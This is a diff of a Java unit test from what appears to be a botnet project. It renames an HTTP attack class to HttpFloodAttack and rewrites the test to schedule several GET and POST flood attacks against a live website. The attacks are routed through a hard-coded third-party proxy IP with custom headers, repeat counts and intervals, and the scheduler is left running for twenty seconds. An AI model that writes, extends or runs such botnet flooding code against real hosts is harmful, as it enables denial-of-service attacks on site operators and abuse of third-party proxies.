@@ -26,7 +26,7 @@
 
 package com.acmutv.botnet.core.exec;
 
-import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
 import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
@@ -85,42 +85,45 @@ public class BotPoolTest {
   @Test
   public void test_schedulingAttack() throws SchedulerException, MalformedURLException, InterruptedException {
     Assume.assumeTrue(ConnectionManager.checkConnection());
-    Set<HttpAttack> attacks = new HashSet<HttpAttack>(){{
-      add(new HttpAttack(HttpMethod.GET, new URL("http://www.google.com")));
-      add(new HttpAttack(HttpMethod.GET, new URL("http://www.google.com"),
-          new HttpProxy("31.220.56.101", 80))
-      );
-      add(
-          new HttpAttack(HttpMethod.GET, new URL("http://www.google.com"),
-              new HashMap<String,String>(){{put("User-Agent", "CustomUSerAgent");}})
-      );
-      add(
-          new HttpAttack(HttpMethod.GET, new URL("http://www.google.com"),
-              new HttpProxy("31.220.56.101", 80),
-              new HashMap<String,String>(){{put("User-Agent", "CustomUSerAgent");}})
-      );
-      add(
-          new HttpAttack(HttpMethod.GET, new URL("http://www.google.com"),
-              new HttpProxy("31.220.56.101", 80),
-              new HashMap<String,String>(){{put("User-Agent", "CustomUSerAgent");}},
-              3, new Interval(2, 3, TimeUnit.SECONDS))
-      );
-    }};
+
+    Set<HttpFloodAttack> attacks = new HashSet<>();
+    attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com")));
+    attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
+        new HttpProxy("31.220.56.101", 80)));
+    attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
+        new HttpProxy("31.220.56.101", 80),
+        3,
+        new Interval(5, 5, TimeUnit.SECONDS)
+    ));
+    attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
+        new HttpProxy("31.220.56.101", 80),
+        new HashMap<String,String>(){{put("User-Agent", "CustomUserAgent");}},
+        new HashMap<String,String>(){{put("foo1", "bar1");}},
+        3,
+        new Interval(5, 5, TimeUnit.SECONDS)
+    ));
+    attacks.add(new HttpFloodAttack(HttpMethod.POST, new URL("http://www.gmarciani.com"),
+        new HttpProxy("31.220.56.101", 80),
+        new HashMap<String,String>(){{put("User-Agent", "CustomUserAgent");}},
+        new HashMap<String,String>(){{put("foo1", "bar1");}},
+        3,
+        new Interval(5,5, TimeUnit.SECONDS)
+    ));
 
     BotPool pool = new BotPool();
 
     pool.getScheduler().standby();
 
-    for (HttpAttack attack : attacks) {
-      pool.scheduleAttackHttp(attack);
+    for (HttpFloodAttack attack : attacks) {
+      pool.scheduleAttackHttpFlooding(attack);
     }
 
-    List<HttpAttack> scheduled = pool.getScheduledHttpAttacks();
+    List<HttpFloodAttack> scheduled = pool.getScheduledHttpAttacks();
     Assert.assertTrue(scheduled.containsAll(attacks));
 
     pool.getScheduler().start();
 
-    Thread.sleep(15000);
+    Thread.sleep(20000);
 
     pool.destroy(true);
 
